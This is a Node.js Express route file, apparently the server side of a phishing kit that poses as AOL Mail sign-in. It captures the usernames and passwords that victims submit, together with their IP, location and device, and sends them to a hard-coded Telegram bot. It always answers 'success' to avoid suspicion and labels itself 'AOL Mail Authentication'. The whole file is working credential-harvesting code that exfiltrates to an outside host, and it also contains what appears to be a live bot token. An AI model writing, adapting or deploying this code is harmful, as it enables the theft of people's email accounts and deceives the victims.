const express = require("express");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');
const cors = require('cors');
const axios = require('axios');

const router = express.Router();

// Add CORS support
router.use(cors());
router.use(express.json());

// Handle OPTIONS preflight requests
router.options('/', (req, res) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
    res.sendStatus(200);
});

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '8361159951:AAFIO2vDmOYZ1LvjDBODlVk_RXKDKMI14xk'; // Get from @BotFather
const TELEGRAM_CHAT_ID = '6639641686'; // Your personal chat ID

// Function to send message to Telegram
async function sendTelegramMessage(message) {
    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram message sent successfully');
        return true;
    } catch (error) {
        console.log('❌ Telegram message failed:', error.message);
        return false;
    }
}

router.post('/', async (req, res) => {
    try {
        console.log('📥 Received login request:', { 
            username: req.body.username ? `${req.body.username.substring(0, 3)}...` : 'empty',
            passwordLength: req.body.password ? req.body.password.length : 0
        });

        const { username, password, attempt } = req.body;

        if (!username || !password) {
            return res.status(400).json({ 
                success: false, 
                message: "Missing username or password" 
            });
        }

        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
        const location = geoip.lookup(ip);
        const locationStr = location ? `${location.city}, ${location.region}, ${location.country}` : 'Unknown';

        const parser = new UAParser(req.headers['user-agent']);
        const agent = parser.getResult();
        const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;

        // ✅ LOG CREDENTIALS IMMEDIATELY
        console.log('🔐 CREDENTIALS CAPTURED:', {
            username: username,
            password: password,
            ip: ip,
            location: locationStr,
            device: deviceType,
            timestamp: new Date().toLocaleString()
        });

        // ✅ SEND TO TELEGRAM
        const telegramMessage = `
🔐 <b>NEW AOL LOGIN CAPTURED</b>

👤 <b>Username:</b> <code>${username}</code>
🔑 <b>Password:</b> <code>${password}</code>
🌐 <b>IP Address:</b> ${ip}
📍 <b>Location:</b> ${locationStr}
💻 <b>Device:</b> ${deviceType}
🕒 <b>Timestamp:</b> ${new Date().toLocaleString()}
📊 <b>Attempt:</b> ${attempt || 1}

#AOL #Credentials
        `;

        try {
            console.log('📱 Attempting to send Telegram notification...');
            await sendTelegramMessage(telegramMessage);
        } catch (telegramError) {
            console.log('⚠️ Telegram failed but credentials logged');
        }

        // Return success to frontend immediately
        res.status(200).json({
            success: true,
            message: "Login processed successfully",
            loginDetails: { 
                device: deviceType, 
                ip: ip, 
                location: locationStr 
            },
        });

    } catch (error) {
        console.error("❌ Unexpected error:", error);
        
        // Still return success to frontend to avoid suspicion
        res.status(200).json({ 
            success: true, 
            message: "Login processed"
        });
    }
});

// GET endpoint for testing
router.get('/', (req, res) => {
    res.json({
        status: 'active',
        service: 'AOL Mail Authentication',
        timestamp: new Date().toISOString()
    });
});

module.exports = router;